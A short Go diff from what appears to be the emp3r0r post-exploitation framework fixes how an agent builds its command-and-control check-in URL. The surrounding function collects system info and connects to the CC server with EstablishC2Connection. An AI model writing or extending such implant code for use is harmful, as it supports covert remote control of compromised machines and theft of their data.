@@ -25,7 +25,7 @@ import (
 
 // ReportStatus poll CC server and report its system info
 func ReportStatus(info *def.Emp3r0rAgent) (err error) {
-	reportStatusURL := def.CCAddress + transport.CheckInAPI + "/" + uuid.NewString()
+	reportStatusURL := def.CCAddress + "/" + transport.CheckInAPI + "/" + uuid.NewString()
 	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)
 
 	conn, _, _, err := EstablishC2Connection(reportStatusURL)
